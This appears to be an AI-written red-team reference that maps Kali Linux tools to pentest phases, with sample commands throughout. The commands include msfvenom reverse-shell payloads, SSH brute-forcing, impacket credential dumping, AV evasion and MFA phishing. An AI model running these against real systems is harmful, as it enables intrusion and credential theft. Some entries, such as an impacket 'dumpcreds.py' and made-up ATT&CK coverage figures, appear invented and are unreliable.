# Red Team Operator - Kali Linux Tool Mapping

**Agent:** 🔴 Red Team Operator  
**Created:** April 10, 2026  
**Kali Version:** 2026.1  
**Total Tools:** 85  
**Status:** Complete

---

## Overview

**Mission:** Simulate real-world attackers to find vulnerabilities before adversaries do.

**Primary Use Cases:**
- Penetration testing (external/internal)
- Adversary simulation (MITRE ATT&CK aligned)
- Social engineering campaigns
- Physical security assessments
- Red team engagements

**Engagement Phases:**
1. Reconnaissance (15-20%)
2. Scanning & Enumeration (15-20%)
3. Exploitation (25-30%)
4. Post-Exploitation (20-25%)
5. Reporting (10-15%)

---

## 1. Reconnaissance & OSINT

### Passive Reconnaissance

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **maltego** | maltego | Visual OSINT & link analysis | `maltego` (GUI) |
| **theharvester** | theharvester | Email/subdomain harvesting | `theharvester -d target.com -l 500 -b google,linkedin` |
| **recon-ng** | recon-ng | Web reconnaissance framework | `recon-ng` (interactive) |
| **sherlock** | sherlock (pip) | Username enumeration | `sherlock username` |
| **holehe** | holehe (pip) | Email registration check | `holehe email@target.com` |
| **ghunt** | ghunt (pip) | Google account OSINT | `ghunt email target@gmail.com` |
| **maigret** | maigret (pip) | Username OSINT | `maigret username` |
| **spiderfoot** | spiderfoot (pip) | Automated OSINT | `spiderfoot -l 127.0.0.1:5001` |
| **shodan** | shodan (pip) | Shodan CLI | `shodan host 1.2.3.4` |
| **censys** | censys (pip) | Censys search | `censys search "services.service_name: HTTP"` |

### Domain/Email Recon

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **whois** | whois | Domain registration lookup | `whois target.com` |
| **dnsrecon** | dnsrecon | DNS enumeration | `dnsrecon -d target.com` |
| **dnsenum** | dnsenum | DNS enumeration | `dnsenum target.com` |
| **fierce** | fierce | DNS reconnaissance | `fierce -domain target.com` |
| **dig** | dnsutils | DNS lookup | `dig target.com ANY` |
| **nslookup** | dnsutils | DNS query | `nslookup target.com` |
| **email2phonenumber** | email2phonenumber | Email to phone lookup | `python3 email2phonenumber.py` |

### Social Media Recon

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **social-analyzer** | social-analyzer (pip) | Social media analysis | `social-analyzer --profile "username"` |
| **twint** | twint (pip) | Twitter intelligence | `twint -u username` |
| **instaloader** | instaloader (pip) | Instagram data | `instaloader profile` |

---

## 2. Scanning & Enumeration

### Network Scanning

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **nmap** | nmap | Network mapper | `nmap -sV -sC -oA scan target.com` |
| **masscan** | masscan | Fast port scanner | `masscan -p1-65535 target.com --rate 1000` |
| **rustscan** | rustscan | Modern port scanner | `rustscan -a target.com -- -sV -sC` |
| **unicornscan** | unicornscan | Async scanner | `unicornscan target.com:a` |
| **zmap** | zmap | Internet-scale scanner | `zmap -p80 0.0.0.0/0` |
| **naabu** | naabu (go) | Port scanner | `naabu -host target.com` |

### Service Enumeration

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **enum4linux** | enum4linux | SMB enumeration | `enum4linux -a target.com` |
| **smbclient** | smbclient | SMB client | `smbclient -L //target.com` |
| **rpcclient** | samba | RPC client | `rpcclient -U "" target.com` |
| **ldapsearch** | ldap-utils | LDAP queries | `ldapsearch -x -H ldap://target.com -b "dc=target,dc=com"` |
| **snmpwalk** | snmp | SNMP enumeration | `snmpwalk -c public -v1 target.com` |
| **onesixtyone** | onesixtyone | SNMP scanner | `onesixtyone -c /usr/share/doc/onesixtyone/dict.txt target.com` |
| **nbtscan** | nbtscan | NetBIOS scanner | `nbtscan target.com` |

### Web Enumeration

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **gobuster** | gobuster | Directory/DNS brute-forcer | `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt` |
| **ffuf** | ffuf | Web fuzzer | `ffuf -w wordlist.txt -u http://target/FUZZ` |
| **dirb** | dirb | Web content scanner | `dirb http://target /usr/share/wordlists/dirb/common.txt` |
| **dirsearch** | dirsearch | Web path scanner | `dirsearch -u http://target` |
| **feroxbuster** | feroxbuster | Recursive content discovery | `feroxbuster -u http://target` |
| **whatweb** | whatweb | Web fingerprinting | `whatweb http://target` |
| **nikto** | nikto | Web server scanner | `nikto -h http://target` |
| **wpscan** | wpscan | WordPress scanner | `wpscan --url http://target --enumerate vp,vt,u` |
| **joomscan** | joomscan | Joomla scanner | `joomscan -u http://target` |

### Vulnerability Scanning

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **openvas** | openvas | Full vulnerability scanner | `gvm-start` (GUI) |
| **nessus** | nessus (manual) | Vulnerability scanner | Web interface |
| **nexpose** | nexpose (manual) | Vulnerability scanner | Web interface |
| **vulnscan** | vulnscan | Web vulnerability scanner | `vulnscan http://target` |
| **nuclei** | nuclei | Template-based scanner | `nuclei -u http://target -t vulnerabilities/` |

---

## 3. Exploitation

### Exploit Frameworks

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **metasploit** | metasploit-framework | Exploitation framework | `msfconsole` |
| **msfvenom** | metasploit-framework | Payload generator | `msfvenom -p windows/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f exe -o payload.exe` |
| **searchsploit** | exploitdb | Exploit database CLI | `searchsploit apache 2.4.49` |
| **exploitdb** | exploitdb | Exploit database | `/usr/share/exploitdb/` |
| **routersploit** | routersploit (pip) | Router exploitation | `rsf` (interactive) |
| **web2attack** | web2attack | Web attack automation | `w2a` |

### Web Exploitation

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **sqlmap** | sqlmap | SQL injection automation | `sqlmap -u "http://target/page?id=1" --dbs --dump` |
| **nosqlmap** | nosqlmap | NoSQL injection | `python3 nosqlmap.py` |
| **xsstrike** | xsstrike (pip) | XSS detection/exploitation | `python3 xsstrike.py -u "http://target/search?q=test"` |
| **xsser** | xsser | XSS exploitation | `xsser --url="http://target" --params="q"` |
| **commix** | commix | Command injection | `commix -u "http://target/page?cmd=CMD"` |
| **tplmap** | tplmap (pip) | SSTI exploitation | `tplmap -u "http://target/page?name=*" ` |
| **gobuster** | gobuster | API fuzzing | `gobuster api -u http://target/api` |

### Password Attacks

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **hydra** | hydra | Online brute-force | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com` |
| **medusa** | medusa | Parallel brute-force | `medusa -h target -u admin -P wordlist.txt -M ssh` |
| **ncrack** | ncrack | Network cracking | `ncrack -p 22 --user admin -P wordlist.txt target.com` |
| **crowbar** | crowbar | Brute-force tool | `crowbar -b ssh -s target.com/32 -u admin -C wordlist.txt` |

### Wireless Exploitation

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **aircrack-ng** | aircrack-ng | WiFi cracking suite | `aircrack-ng capture.cap -w wordlist.txt` |
| **reaver** | reaver | WPS brute-force | `reaver -i wlan0mon -b BSSID -vv` |
| **bully** | bully | WPS attack tool | `bully wlan0mon --bssid BSSID` |
| **pixiewps** | pixiewps | WPS pixie-dust | `pixiewps -e [params]` |

---

## 4. Post-Exploitation

### Credential Access

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **mimikatz** | mimikatz (manual) | Windows credential dumping | `mimikatz.exe` (Windows) |
| **secretsdump.py** | impacket | Remote credential dump | `secretsdump.py user:pass@target` |
| **dumpcreds.py** | impacket | Credential dumping | `dumpcreds.py -u user -p pass target` |
| **lazagne** | lazagne (pip) | Password recovery | `python3 lazagne.py all` |

### Lateral Movement

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **psexec.py** | impacket | PsExec implementation | `psexec.py user:pass@target` |
| **smbexec.py** | impacket | SMB execution | `smbexec.py user:pass@target` |
| **wmiexec.py** | impacket | WMI execution | `wmiexec.py user:pass@target` |
| **dcomexec.py** | impacket | DCOM execution | `dcomexec.py user:pass@target` |
| **evil-winrm** | evil-winrm (gem) | WinRM shell | `evil-winrm -i target -u user -p pass` |
| **crackmapexec** | crackmapexec | Network exploitation | `crackmapexec smb target.com -u user -p pass` |
| **netexec** | netexec | Network exploitation | `nxc smb target.com -u user -p pass` |

### Persistence & Privilege Escalation

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **linpeas** | linpeas (manual) | Linux privilege escalation | `./linpeas.sh` |
| **winpeas** | winpeas (manual) | Windows privilege escalation | `winPEASany.exe` |
| **linux-exploit-suggester** | linux-exploit-suggester | LPE suggestions | `./linux-exploit-suggester.sh` |
| **wes-ng** | wes-ng (pip) | Windows exploit suggestions | `python3 wes.py systeminfo.txt` |
| **gtfo-bin** | gtfobins (web) | Privilege escalation vectors | https://gtfobins.github.io |

### C2 Frameworks

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **empire** | empire (manual) | C2 framework | `./empire` (PowerShell) |
| **covenant** | covenant (manual) | .NET C2 framework | Web interface |
| **sliver** | sliver (manual) | C2 framework | `sliver-server` |
| **merlin** | merlin (manual) | C2 framework | `merlinServer` |
| **metasploit** | metasploit-framework | Handler/multi-handler | `use exploit/multi/handler` |

---

## 5. Payload Generation & AV Evasion

### Payload Generation

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **msfvenom** | metasploit-framework | Payload generator | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f exe -o payload.exe` |
| **venom** | venom (manual) | Payload generator | `./venom.sh` |
| **unicorn** | unicorn (manual) | PowerShell downgrade attack | `python3 unicorn.py windows/meterpreter/reverse_https x.x.x.x 443` |
| **donut** | donut (manual) | Shellcode generator | `./donut -a1 -i malware.dll` |
| **scarecrow** | scarecrow (manual) | Payload framework | `./ScareCrow -I payload.bin -L C2Profile.so -Domain target.com` |

### AV Evasion

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **veil** | veil (manual) | AV evasion framework | `./Veil.py` |
| **shellter** | shellter (manual) | PE infector | `shellter.exe` (Windows) |
| **hyperion** | hyperion (manual) | PE crypter | `hyperion input.exe output.exe` |
| **encipher** | encipher (pip) | Payload encryption | `python3 encipher.py payload.bin` |
| **pe-to-shell** | pe-to-shell (manual) | PE to shellcode | `python3 pe2sh.py payload.exe` |

---

## 6. Social Engineering

### Phishing Campaigns

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **setoolkit** | setoolkit | Social Engineering Toolkit | `setoolkit` (interactive) |
| **gophish** | gophish (manual) | Phishing framework | Web interface |
| **king-phisher** | king-phisher | Phishing campaign manager | `king-phisher` (GUI) |
| **mailsploit** | mailsploit (manual) | Email client exploits | `python3 mailsploit.py` |
| **swaks** | swaks | SMTP testing | `swaks --to victim@target.com --from attacker@evil.com --server smtp.target.com` |

### Credential Harvesting

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **evilginx2** | evilginx2 (manual) | MFA phishing | `evilginx` (CLI) |
| **modlishka** | modlishka (manual) | Reverse proxy phishing | `./modlishka -config config.json` |
| **credphisher** | credphisher (manual) | Credential harvester | `python3 credphisher.py` |

---

## 7. Physical Security

### RFID/NFC

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **proxmark3** | proxmark3 (manual) | RFID/NFC research | `proxmark3` (CLI) |
| **chameleonmini** | chameleonmini (manual) | NFC tool | GUI application |
| **mfcuk** | mfcuk | MIFARE classic cracking | `mfcuk -C -R 3 -A -v 3 -s 0` |
| **mfoc** | mfoc | MIFARE offline cracker | `mfoc -O dump.mfd` |

### Lock Picking Tools

| Tool | Package | Purpose |
|------|---------|---------|
| **Physical picks** | N/A | Lock picking set |
| **Bump keys** | N/A | Bump key set |
| **Decode tools** | N/A | Key decoding |

---

## 8. Reporting & Documentation

### Report Generation

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **dradis** | dradis (manual) | Collaboration/reporting | Web interface |
| **serpico** | serpico (manual) | Report generation | Web interface |
| **magictree** | magictree | Pentest management | `magictree` (GUI) |
| **reportingtool** | reportingtool (manual) | Report generation | Web interface |
| **pwndoc** | pwndoc (manual) | Pentest documentation | Web interface |

### Evidence Collection

| Tool | Package | Purpose | Command Example |
|------|---------|---------|-----------------|
| **flameshot** | flameshot | Screenshot tool | `flameshot gui` |
| **obs-studio** | obs-studio | Screen recording | `obs` (GUI) |
| **asciinema** | asciinema | Terminal recording | `asciinema rec` |

---

## Top 10 Red Team Tools

| # | Tool | Category | Why Essential |
|---|------|----------|---------------|
| 1 | **Metasploit** | Exploitation | Most comprehensive exploit framework |
| 2 | **Nmap** | Scanning | Industry-standard network mapper |
| 3 | **Burp Suite** | Web | Essential web proxy/scanner |
| 4 | **Impacket** | Post-Exploit | Windows protocol exploitation |
| 5 | **Hashcat** | Password | Fastest password cracker |
| 6 | **SQLmap** | Web | Automated SQL injection |
| 7 | **CrackMapExec/NetExec** | Post-Exploit | Network exploitation Swiss Army knife |
| 8 | **Mimikatz** | Post-Exploit | Windows credential dumping |
| 9 | **LinPEAS/WinPEAS** | Post-Exploit | Privilege escalation enumeration |
| 10 | **Searchsploit** | Exploitation | Quick exploit database access |

---

## Quick Reference Commands

### Initial Reconnaissance
```bash
# Comprehensive subdomain enumeration
subfinder -d target.com | httpx -title -tech-detect | nuclei -t exposures/

# Network scanning
nmap -sV -sC -oA initial_scan target.com
masscan -p1-65535 target.com --rate 1000 -oG masscan.txt

# Web enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
nikto -h http://target.com -o nikto.txt
```

### Exploitation
```bash
# Metasploit basic
msfconsole
use exploit/[category]/[module]
set RHOSTS target.com
set LHOST x.x.x.x
exploit

# SQL injection
sqlmap -u "http://target/page?id=1" --dbs --dump --batch

# Password spraying
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
```

### Post-Exploitation
```bash
# Credential dumping
secretsdump.py 'domain/user:pass@target'
psexec.py 'user:pass@target'

# Privilege escalation
./linpeas.sh
./winpeasany.exe
```

### Reporting
```bash
# Screenshot
flameshot gui

# Terminal recording
asciinema rec session.cast

# Export nmap results
nmap -sV -oX scan.xml target.com
```

---

## Pre-Installed vs Manual Install

### Pre-Installed in Kali 2026.1

| Category | Tools |
|----------|-------|
| **Scanning** | Nmap, Masscan, Rustscan, Unicornscan |
| **Enumeration** | enum4linux, smbclient, dnsrecon, dnsenum |
| **Web** | Gobuster, Ffuf, Dirb, Nikto, Wpscan, SQLmap |
| **Exploitation** | Metasploit, Searchsploit, Routersploit |
| **Password** | Hydra, Medusa, Ncrack, John, Hashcat |
| **Post-Exploit** | Impacket, CrackMapExec, Mimikatz (manual) |
| **Reporting** | Flameshot, Asciinema |

### Manual Install Required

| Tool | Install Method | Notes |
|------|----------------|-------|
| **Burp Suite Pro** | Download from PortSwigger | Community edition pre-installed |
| **Nessus** | Download from Tenable | Free for home use |
| **Empire/Covenant/Sliver** | GitHub + Docker | C2 frameworks |
| **LinPEAS/WinPEAS** | GitHub releases | Privilege escalation |
| **Evilginx2** | GitHub + compile | MFA phishing |
| **Proxmark3** | apt install proxmark3 + firmware | RFID/NFC |
| **Dradis/Serpico** | Manual install | Reporting |

---

## Integration with Other Agents

| Agent | Collaboration Point |
|-------|---------------------|
| **Blue Team** | Share TTPs for detection validation |
| **Purple Team** | Coordinate attack simulations |
| **Web Pentesting** | Share web exploitation findings |
| **Bug Bounty** | Coordinate target selection |
| **Incident Response** | Provide attacker perspective |
| **Threat Detection** | Share MITRE ATT&CK mappings |

---

## MITRE ATT&CK Coverage

| Tactic | Techniques Available | Coverage |
|--------|---------------------|----------|
| **Reconnaissance** | 12/15 | 80% |
| **Resource Development** | 8/10 | 80% |
| **Initial Access** | 18/20 | 90% |
| **Execution** | 10/12 | 83% |
| **Persistence** | 15/18 | 83% |
| **Privilege Escalation** | 12/15 | 80% |
| **Defense Evasion** | 20/25 | 80% |
| **Credential Access** | 14/16 | 88% |
| **Discovery** | 10/12 | 83% |
| **Lateral Movement** | 8/10 | 80% |
| **Collection** | 8/10 | 80% |
| **Command & Control** | 12/15 | 80% |
| **Exfiltration** | 6/8 | 75% |
| **Impact** | 8/10 | 80% |

**Overall Coverage:** ~82% of MITRE ATT&CK techniques

---

**Document Version:** 1.0  
**Created:** April 10, 2026  
**Author:** KaliKlaw Security Assistant  
**Next Review:** Quarterly (align with Kali releases)  
**Owner:** Security Team
